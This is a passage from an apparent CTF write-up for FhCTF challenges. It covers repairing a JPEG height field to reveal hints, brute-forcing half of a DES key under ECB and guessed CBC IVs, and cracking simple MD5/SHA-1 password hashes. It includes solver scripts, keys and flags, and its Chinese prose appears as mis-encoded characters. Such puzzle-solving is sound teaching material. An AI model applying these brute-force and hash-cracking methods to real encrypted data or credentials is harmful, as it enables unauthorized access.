class="line">matches = [m.start() <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">b&#x27;\xff[\xc0\xc2]&#x27;</span>, data)]</span><br></pre></td></tr></table></figure>
<p>æ­¤æ­¥é©Ÿæ‰¾å‡ºæ‰€æœ‰å®šç¾©åœ–ç‰‡å°ºå¯¸çš„ Header ä½ç½®ã€‚ç”±æ–¼ JPEG å¯èƒ½åŒ…å«ç¸®åœ– (Thumbnail)ï¼Œå› æ­¤å¯èƒ½å­˜åœ¨å¤šå€‹ SOF å€å¡Š `</p>
<p>B. é–å®šä¸»åœ–ç‰‡</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">max_width = <span class="number">0</span></span><br><span class="line">target_idx = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sof_pos <span class="keyword">in</span> matches:</span><br><span class="line">    <span class="comment"># è·³éæ¨™è¨˜æœ¬èº« (2 bytes) å’Œé•·åº¦æ¬„ä½ (2 bytes) å’Œç²¾åº¦ (1 byte)</span></span><br><span class="line">    h_idx = sof_pos + <span class="number">5</span>  <span class="comment"># é«˜åº¦ä½ç½®</span></span><br><span class="line">    w_idx = sof_pos + <span class="number">7</span>  <span class="comment"># å¯¬åº¦ä½ç½®</span></span><br><span class="line"></span><br><span class="line">    h = struct.unpack(<span class="string">&quot;&gt;H&quot;</span>, data[h_idx:h_idx+<span class="number">2</span>])[<span class="number">0</span>]</span><br><span class="line">    w = struct.unpack(<span class="string">&quot;&gt;H&quot;</span>, data[w_idx:w_idx+<span class="number">2</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> w &gt; max_width:  <span class="comment"># æ‰¾å‡ºå¯¬åº¦æœ€å¤§çš„å€å¡Š</span></span><br><span class="line">        max_width = w</span><br><span class="line">        target_idx = h_idx</span><br></pre></td></tr></table></figure>
<p><code>&gt;H</code> è¡¨ç¤º Big-Endian Unsigned Shortï¼Œç¬¦åˆ JPEG è¦ç¯„ ã€‚ä¸»åœ–ç‰‡é€šå¸¸å…·æœ‰æœ€å¤§çš„å¯¬åº¦å°ºå¯¸</p>
<p>C. ä¿®æ”¹é«˜åº¦ä¸¦å„²å­˜</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">new_height = <span class="number">2000</span>  <span class="comment"># è¨­å®šç‚ºè¶³å¤ å¤§çš„é«˜åº¦</span></span><br><span class="line">data[target_idx:target_idx+<span class="number">2</span>] = struct.pack(<span class="string">&quot;&gt;H&quot;</span>, new_height)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;treasuremap_fixed.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸä¿®å¾©å¾Œï¼Œé–‹å•Ÿåœ–ç‰‡å³å¯çœ‹åˆ°åº•éƒ¨éš±è—çš„è³‡è¨Šï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li><code>plaintext.enc</code> æª”æ¡ˆæç¤º</li>
<li>éƒ¨åˆ† Key æç¤ºï¼š<code>r5K9</code></li>
</ul>
<p><img src="/images/FhCTF/34.webp" alt="{6ED9B10C-BFBE-4518-B8C4-EF7B5ABA8D9F}" /></p>
</li>
</ul>
</li>
<li>
<p>Part 2: DES å¯†é‘°çˆ†ç ´ (Cryptography)</p>
<ul>
<li>
<p>é¡Œç›®èƒŒæ™¯</p>
<p><strong>åŠ å¯†æ¼”ç®—æ³•</strong>: DES (Data Encryption Standard)<br />
<strong>è¼¸å…¥æª”æ¡ˆ</strong>: <code>plaintext.enc</code> (hex ç·¨ç¢¼çš„å¯†æ–‡)<br />
<strong>å·²çŸ¥è³‡è¨Š</strong>:</p>
<ul>
<li>é¡Œç›®æç¤ºï¼š&quot;<strong>The Data</strong> å¯ä»¥å¹«ä½ åŠ é€Ÿè§£å¯†&quot;</li>
<li>åœ°åœ–å³ä¸‹è§’ç´…å­—ï¼š<code>key éƒ¨åˆ†ï¼šr5K9</code></li>
</ul>
</li>
<li>
<p>åŠ å¯†æ¨¡å¼åˆ¤æ–·</p>
<p>æª¢æŸ¥ <code>plaintext.enc</code> ç‰¹å¾µï¼š</p>
<ol>
<li>Hex å­—ä¸²é•·åº¦ç‚ºå¶æ•¸ â†’ å¯è½‰æ›ç‚º bytes</li>
<li>è½‰æ›å¾Œé•·åº¦æ˜¯ 8 çš„å€æ•¸ â†’ ç¬¦åˆ DES block size</li>
</ol>
<p>ç”±æ–¼é¡Œç›®æœªæä¾› IV (Initialization Vector)ï¼Œä¸”é€™æ˜¯å…¥é–€ç´š CTF é¡Œç›®ï¼Œæ¨æ¸¬ä½¿ç”¨ <strong>DES-ECB æ¨¡å¼</strong> ã€‚[3]</p>
<p><strong>ECB ç‰¹æ€§</strong>ï¼š</p>
<ul>
<li>ä¸éœ€è¦ IV</li>
<li>æ¯å€‹ block ç¨ç«‹åŠ å¯†/è§£å¯†</li>
<li>ç›¸åŒæ˜æ–‡ block ç”¢ç”Ÿç›¸åŒå¯†æ–‡ block[3]</li>
</ul>
</li>
<li>
<p>å¯†é‘°çµæ§‹åˆ†æ</p>
<p>DES å¯†é‘°å›ºå®šç‚º <strong>8 bytes</strong>ã€‚<br />
å·²çŸ¥å‰ 4 bytesï¼š<code>r5K9</code><br />
æœªçŸ¥å¾Œ 4 bytesï¼šéœ€è¦çˆ†ç ´</p>
<p><strong>å­—å…ƒé›†</strong>: è‹±æ–‡å¤§å°å¯« + æ•¸å­— = 62 å€‹å­—å…ƒ<br />
<strong>çµ„åˆæ•¸</strong>: 62^4 = 14,776,336 ç¨®å¯èƒ½</p>
</li>
</ul>
</li>
<li>
<p>åŠ é€Ÿç­–ç•¥</p>
<p>é¡Œç›®æç¤º &quot;The Data can help you decrypt faster&quot; æ„å‘³è‘—ï¼š</p>
<ul>
<li>ä¸éœ€è¦è§£å¯†æ•´å€‹æª”æ¡ˆ</li>
<li>åªè§£å¯†<strong>ç¬¬ä¸€å€‹ block (8 bytes)</strong> å³å¯é©—è­‰å¯†é‘°æ­£ç¢ºæ€§</li>
<li>åˆ©ç”¨å·²çŸ¥æ˜æ–‡æ”»æ“Š (Known-Plaintext Attack) çš„æ¦‚å¿µ</li>
</ul>
</li>
<li>
<p>è§£é¡Œè…³æœ¬</p>
<p>çˆ†ç ´ç‰ˆæœ¬</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®€å– hex å¯†æ–‡</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ct_hex = f.read().strip()</span><br><span class="line">ct = binascii.unhexlify(ct_hex)</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">b&quot;r5K9&quot;</span></span><br><span class="line">charset = (string.ascii_letters + string.digits).encode()</span><br><span class="line">ct0 = ct[:<span class="number">8</span>]  <span class="comment"># åªå–ç¬¬ä¸€å€‹ block</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_printable</span>(<span class="params">bs: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= b &lt; <span class="number">127</span> <span class="keyword">or</span> b <span class="keyword">in</span> (<span class="number">10</span>, <span class="number">13</span>, <span class="number">9</span>) <span class="keyword">for</span> b <span class="keyword">in</span> bs)</span><br><span class="line"></span><br><span class="line">found = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> suf <span class="keyword">in</span> itertools.product(charset, repeat=<span class="number">4</span>):</span><br><span class="line">    key = prefix + <span class="built_in">bytes</span>(suf)</span><br><span class="line">    cipher = DES.new(key, DES.MODE_ECB)</span><br><span class="line">    pt0 = cipher.decrypt(ct0)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_printable(pt0) <span class="keyword">and</span> pt0.startswith(<span class="string">b&quot;Here is&quot;</span>):</span><br><span class="line">        found = key</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Key found: <span class="subst">&#123;key.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Key not found&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨æ‰¾åˆ°çš„å¯†é‘°è§£å¯†å®Œæ•´æª”æ¡ˆ</span></span><br><span class="line">cipher = DES.new(found, DES.MODE_ECB)</span><br><span class="line">pt = cipher.decrypt(ct)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç§»é™¤ PKCS7 padding</span></span><br><span class="line">pad = pt[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span> &lt;= pad &lt;= <span class="number">8</span> <span class="keyword">and</span> pt.endswith(<span class="built_in">bytes</span>([pad]) * pad):</span><br><span class="line">    pt = pt[:-pad]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.dec.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(pt)</span><br></pre></td></tr></table></figure>
<p><strong>åŸ·è¡Œçµæœ</strong>:</p>
  <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[+]</span> Key found: r5K9zXxv</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥è§£å¯†ç‰ˆæœ¬</p>
<p>è‹¥å·²çŸ¥å®Œæ•´å¯†é‘°ï¼Œå¯ç›´æ¥è§£å¯†ï¼š</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = binascii.unhexlify(f.read().strip())</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;r5K9zXxv&quot;</span></span><br><span class="line">cipher = DES.new(key, DES.MODE_ECB)</span><br><span class="line">plain = cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç§»é™¤ padding</span></span><br><span class="line">pad = plain[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span> &lt;= pad &lt;= <span class="number">8</span> <span class="keyword">and</span> plain.endswith(<span class="built_in">bytes</span>([pad]) * pad):</span><br><span class="line">    plain = plain[:-pad]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.dec.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(plain)</span><br></pre></td></tr></table></figure>
<ul>
<li>çµæœ</li>
</ul>
<p>æˆåŠŸè§£å¯†å¾Œçš„ <code>plaintext.dec.txt</code> å…§å®¹ï¼š</p>
  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Here is your reward for finding the <span class="attribute">right</span> key:</span><br><span class="line">FhCTF&#123;D0n7_c0un7_7h3_d4y5_m4k3_7h3_d4y5_c0un7&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;D0n7_c0un7_7h3_d4y5_m4k3_7h3_d4y5_c0un7&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="des-lv2-å†æ¢è€èˆ¹é•·çš„å¯¶è—write-up"><a class="markdownIt-Anchor" href="#des-lv2-å†æ¢è€èˆ¹é•·çš„å¯¶è—write-up"></a> DES Lv.2 â€“ å†æ¢è€èˆ¹é•·çš„å¯¶è—ï¼ˆWrite-upï¼‰</h3>
<ul>
<li>
<p>é¡Œç›®æè¿°èˆ‡ç·šç´¢æ•´ç†</p>
<p>é¡Œç›®æç¤ºï¼š</p>
<ul>
<li>æœ‰ä¸€ä»½åŠ å¯†è³‡æ–™ï¼ˆ<code>plaintext.enc</code>ï¼‰</li>
<li>ä¸Šä¸€é¡Œ key æ›¾å‡ºç¾ <code>r5K9zXxv</code></li>
<li>åœ–ä¸Šé‚„æœ‰ <code>r5K9</code>ã€<code>A.D.1688</code></li>
<li>ä¸¦æ˜ç¢ºæç¤º <strong>â€œThe Data.â€ å¯ä»¥å¹«ä½ åŠ é€Ÿè§£å¯†</strong></li>
</ul>
<p>ç›®æ¨™ï¼šè§£å‡ºå¯†æ–‡å…§å®¹ï¼Œæ‰¾åˆ° GPS åº§æ¨™æˆ– Flagã€‚</p>
</li>
<li>
<p>åˆæ­¥åˆ†æï¼šå¯†æ–‡æ ¼å¼èˆ‡ DES ç‰¹å¾µ</p>
<p>æ‹¿åˆ° <code>plaintext.enc</code> å¾Œå…ˆåšæ ¼å¼åˆ¤æ–·ï¼š</p>
<ul>
<li>æª”æ¡ˆå…§å®¹çœ‹èµ·ä¾†åƒä¸€é•·ä¸² <strong>hex å­—å…ƒ</strong>ï¼ˆ<code>0-9a-f</code>ï¼‰</li>
<li>å› æ­¤éœ€å…ˆ <code>bytes.fromhex(...)</code> æ‰èƒ½å¾—åˆ°çœŸæ­£å¯†æ–‡ bytes</li>
<li>DES block size = 8 bytesï¼Œå› æ­¤å¯†æ–‡é•·åº¦æ‡‰è©²æ˜¯ 8 çš„å€æ•¸ï¼ˆç”¨æ–¼é©—è­‰è³‡æ–™åˆç†æ€§ï¼‰</li>
</ul>
<p>ç¨‹å¼ä¸­å°æ‡‰è™•ç†ï¼š</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plaintext.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ct = <span class="built_in">bytes</span>.fromhex(f.read().decode(<span class="string">&quot;ascii&quot;</span>).strip())</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æ”»æ“Šç­–ç•¥ï¼šçŒœ mode/IV + çˆ†ç ´ key çµæ§‹</p>
<p>DES é¡Œå¸¸è¦‹é™·é˜±ä¸æ˜¯åªåœ¨ keyï¼Œè€Œæ˜¯ï¼š</p>
<ul>
<li>
<p>mode å¯èƒ½æ˜¯ ECB / CBC / CFB / OFBâ€¦</p>
</li>
<li>
<p>CBC éœ€è¦ IVï¼ŒIV å¯èƒ½æ˜¯ï¼š</p>
<ul>
<li>å›ºå®šå€¼ï¼ˆå…¨ 0ï¼‰</li>
<li>ç”±æç¤ºå­—ä¸²ï¼ˆä¾‹å¦‚ <code>&quot;The Data&quot;</code>ï¼‰æä¾›</li>
<li>ç›´æ¥æ”¾åœ¨å¯†æ–‡å‰ 8 bytesï¼ˆ<code>IV || CIPHERTEXT</code>ï¼‰</li>
</ul>
</li>
<li>
<p>key æœ‰å¯èƒ½ä¸æ˜¯ä½ ä»¥ç‚ºçš„ <code>r5K9????</code>ï¼Œä¹Ÿå¯èƒ½æ˜¯ <code>????r5K9</code></p>
</li>
</ul>
<p>å› æ­¤æœ¬è§£æ³•æ¡ç”¨ï¼š</p>
<ul>
<li>
<p>(A) åŒæ™‚æ¸¬å¤šç¨®åŠ å¯†æƒ…å¢ƒï¼ˆschemesï¼‰</p>
<p>åœ¨ <code>try_dump()</code> è£¡ä¸€æ¬¡æ¸¬å››ç¨®æœ€å¸¸è¦‹çµ„åˆï¼š</p>
<ol>
<li>CBC + IV = <code>&quot;The Data&quot;</code></li>
<li>CBC + IV = <code>00...00</code></li>
<li>CBC + IV = <code>ct[:8]</code>ï¼ˆå¸¸è¦‹ <code>IV||C</code> æ ¼å¼ï¼‰</li>
<li>ECBï¼ˆä¸éœ€è¦ IVï¼‰</li>
</ol>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">schemes = [</span><br><span class="line">    (<span class="string">&quot;CBC_IV_TheData&quot;</span>, DES.MODE_CBC, <span class="string">b&quot;The Data&quot;</span>, ct),</span><br><span class="line">    (<span class="string">&quot;CBC_IV_zeros&quot;</span>,   DES.MODE_CBC, <span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span>,  ct),</span><br><span class="line">    (<span class="string">&quot;CBC_IV_prefix&quot;</span>,  DES.MODE_CBC, ct[:<span class="number">8</span>],     ct[<span class="number">8</span>:]),</span><br><span class="line">    (<span class="string">&quot;ECB&quot;</span>,            DES.MODE_ECB, <span class="literal">None</span>,       ct),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>(B) åŒæ™‚æ¸¬å¤šç¨® key çµæ§‹ï¼ˆkey structuresï¼‰</p>
<p>ç”±æ–¼åœ–ä¸Šæœ‰ <code>r5K9</code>ï¼Œä¸Šä¸€é¡Œå®Œæ•´ key æœ‰ <code>zXxv</code>ï¼ˆ<code>r5K9zXxv</code>ï¼‰ï¼Œå› æ­¤å‡è¨­ key å¯èƒ½ç”±å›ºå®š 4 ç¢¼ + å¯çˆ† 4 ç¢¼çµ„æˆã€‚</p>
<p>æ¸¬è©¦å…©å€‹ baseï¼ˆå¯è‡ªè¡Œæ“´å……ï¼‰ï¼š</p>
<ul>
<li><code>base = b&quot;r5K9&quot;</code></li>
<li><code>base = b&quot;zXxv&quot;</code></li>
</ul>
<p>ä¸¦å°æ¯å€‹ base æ¸¬å…©ç¨®æ‹¼æ³•ï¼š</p>
<ul>
<li><code>base + suf</code>  â†’ <code>r5K9????</code></li>
<li><code>suf + base</code>  â†’ <code>????r5K9</code></li>
</ul>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bases = [<span class="string">b&quot;r5K9&quot;</span>, <span class="string">b&quot;zXxv&quot;</span>]</span><br><span class="line"></span><br><span class="line">keys = [</span><br><span class="line">    base + suf,</span><br><span class="line">    suf + base,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>çˆ†ç ´ç¯„åœï¼ˆcharset / keyspaceï¼‰</p>
<p>suffix ä½¿ç”¨å¸¸è¦‹å¯è¦‹å­—å…ƒé›†åˆï¼š</p>
<ul>
<li><code>a-zA-Z0-9</code> åŠ ä¸Šä¸€äº›å¸¸è¦‹ç¬¦è™Ÿ <code>_ - ! @ # .</code></li>
<li>ç›®çš„ï¼šæ¶µè“‹ CTF å¸¸ç”¨ key é¢¨æ ¼ï¼ŒåŒæ™‚é¿å…ä¸€æ¬¡æŠŠ printable å…¨å¡çˆ†é€ æˆæ™‚é–“å¤±æ§</li>
</ul>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">charset = (string.ascii_letters + string.digits + <span class="string">&quot;_-!@#.&quot;</span>).encode()</span><br></pre></td></tr></table></figure>
<p>çˆ†ç ´ keyspace ç´„ç‚ºï¼š</p>
<ul>
<li>charset é•·åº¦ â‰ˆ 67</li>
<li>suffix 4 ç¢¼ â†’ <code>67^4 â‰ˆ 20,151,121</code></li>
</ul>
</li>
<li>
<p>å¿«é€Ÿåˆ¤æ–·æ˜¯å¦è§£å°ï¼ˆé¿å…æ¯æŠŠ key è§£å…¨æ–‡ï¼‰</p>
<p>çˆ†ç ´æœ€æ…¢çš„åœ°æ–¹ä¸æ˜¯ã€Œè©¦ keyã€ï¼Œè€Œæ˜¯ã€Œæ¯æŠŠ key éƒ½è§£å®Œæ•´å¯†æ–‡ã€ã€‚<br />
å› æ­¤æ­¤è§£æ³•æ¡ç”¨<strong>å¿«é€Ÿéæ¿¾</strong>ï¼š</p>
<ul>
<li>(A) åªè§£å‰ 64 bytes ç•¶ head åšåˆ¤æ–·</li>
</ul>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head = DES.new(key8, mode, iv=iv).decrypt(body[:<span class="number">64</span>])</span><br></pre></td></tr></table></figure>
<ul>
<li>(B) åˆ¤æ–· head æ˜¯å¦åƒç­”æ¡ˆ</li>
</ul>
<p>ç”¨å…©ç¨®æ¢ä»¶ï¼š</p>
<ol>
<li><strong>GPS regex å‘½ä¸­</strong></li>
<li><strong>å¯è¦‹å­—å…ƒæ¯”ä¾‹é«˜</strong></li>
</ol>
<ul>
<li>
<p>GPS regex</p>
<p>æŠ“å¸¸è¦‹å°æ•¸åº§æ¨™æ ¼å¼ï¼š</p>
<ul>
<li><code>25.0330,121.5654</code></li>
<li><code>-33.86 151.21</code></li>
</ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gps_pat = re.<span class="built_in">compile</span>(<span class="string">rb&#x27;[-+]?\d&#123;1,3&#125;\.\d&#123;3,&#125;\s*[, ]\s*[-+]?\d&#123;1,3&#125;\.\d&#123;3,&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>å¯è¦‹å­—å…ƒæ¯”ä¾‹</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printable_ratio</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">    good = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> b <span class="keyword">if</span> x <span class="keyword">in</span> <span class="string">b&quot;\n\r\t&quot;</span> <span class="keyword">or</span> <span class="number">32</span> &lt;= x &lt;= <span class="number">126</span>)</span><br><span class="line">    <span class="keyword">return</span> good / <span class="built_in">len</span>(b)</span><br></pre></td></tr></table></figure>
<p>ç•¶ <code>gps_pat.search(head)</code> å‘½ä¸­æˆ– <code>printable_ratio(head) &gt; 0.92</code>ï¼Œæ‰æœƒè§£å…¨æ–‡ã€‚</p>
</li>
<li>
<p>æ‰¾ Flag çš„æ–¹å¼</p>
<p>è‹¥é¡Œç›®ç›´æ¥æŠŠ Flag æ”¾åœ¨æ˜æ–‡ä¸­ï¼Œç¨‹å¼ä¹Ÿæœƒç”¨ regex æœå°‹ï¼š</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_pat = re.<span class="built_in">compile</span>(<span class="string">rb&#x27;FhCTF\&#123;[^&#125;]&#123;1,100&#125;\&#125;&#x27;</span>, re.I)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<ol start="7">
<li>åŸ·è¡Œæ–¹å¼ï¼ˆWindows / PowerShellï¼‰</li>
</ol>
<ul>
<li>å®‰è£å¥—ä»¶</li>
</ul>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="literal">-m</span> pip install pycryptodome</span><br></pre></td></tr></table></figure>
<ul>
<li>åŸ·è¡Œ</li>
</ul>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python slove.py</span><br></pre></td></tr></table></figure>
</li>
<li>
<ol start="8">
<li>ç­‰å¾…ç­‰å¾…æˆåŠŸè¼¸å‡ºåˆ¤è®€(å¤§æ¦‚å¾ˆä¹…</li>
</ol>
</li>
</ul>
<p>ç•¶æ‰¾åˆ°å€™é¸ keyï¼Œç¨‹å¼æœƒå°å‡ºï¼š</p>
<ul>
<li>å‘½ä¸­çš„ key èˆ‡ scheme</li>
<li>head å‰ 200 bytes</li>
<li>è‹¥æœ‰ï¼Œå°å‡º GPS / Flag</li>
<li>ä»¥åŠ plaintext å‰ 500 bytes</li>
</ul>
<p>è¼¸å‡ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*] <span class="keyword">brute </span>forcing key structures...</span><br><span class="line"></span><br><span class="line">[+] HIT! key=<span class="keyword">b&#x27;r5K9bB2x&#x27; </span> <span class="keyword">scheme=CBC_IV_TheData</span></span><br><span class="line"><span class="keyword"></span>[+] head: <span class="keyword">b&#x27;b4NKr3W8 </span>Encryption Standard (DES) is a symmetric-key <span class="keyword">block </span>ciph<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[+] FLAG: b&#x27;</span>FhCTF&#123;<span class="number">23</span>.<span class="number">257735309160896</span>_119.<span class="number">66758643893687</span>&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">b&#x27;</span><span class="keyword">b4NKr3W8 </span>Encryption Standard (DES) is a symmetric-key <span class="keyword">block </span>cipher that operates on fixed-size <span class="keyword">blocks </span>of data. DES processes data in <span class="number">64</span>-<span class="keyword">bit </span>(<span class="number">8</span>-<span class="keyword">byte) </span><span class="keyword">blocks </span><span class="keyword">and </span>uses a <span class="number">64</span>-<span class="keyword">bit </span>key, of which <span class="number">56</span> <span class="keyword">bits </span>are effective key material <span class="keyword">and </span>the remaining <span class="number">8</span> <span class="keyword">bits </span>are used for parity checking. <span class="keyword">Because </span>DES encrypts only one <span class="keyword">block </span><span class="built_in">at</span> a time, it must <span class="keyword">be </span>combined with a mode of operation to securely encrypt data longer than a single <span class="keyword">block.\r\n\r\nOne </span>widely used mode is Cipher <span class="keyword">Block </span>Chaining (CBC). In DES-CBC mode, each<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FhCTF</span>&#123;<span class="number">23</span>.<span class="number">257735309160896</span>_119.<span class="number">66758643893687</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ç®¡ç†å“¡çš„å¯†ç¢¼æ´‹è”¥"><a class="markdownIt-Anchor" href="#ç®¡ç†å“¡çš„å¯†ç¢¼æ´‹è”¥"></a> ç®¡ç†å“¡çš„å¯†ç¢¼æ´‹è”¥</h3>
<p>3å€‹level</p>
<ol>
<li>level 1 çµ¦ <code>md5 hash</code>ï¼Œä¸Šç¶²å·¥å…·æŸ¥è§£å¾—åˆ° <code>qwerty</code></li>
<li>level 2 å€‹ <code>SHA-1</code>ï¼Œä½†ç¶“éé€šéˆï¼Œæˆ‘å€‘å¯ä»¥çŒœåˆ° <code>admin</code> é€™å€‹ç­”æ¡ˆ</li>
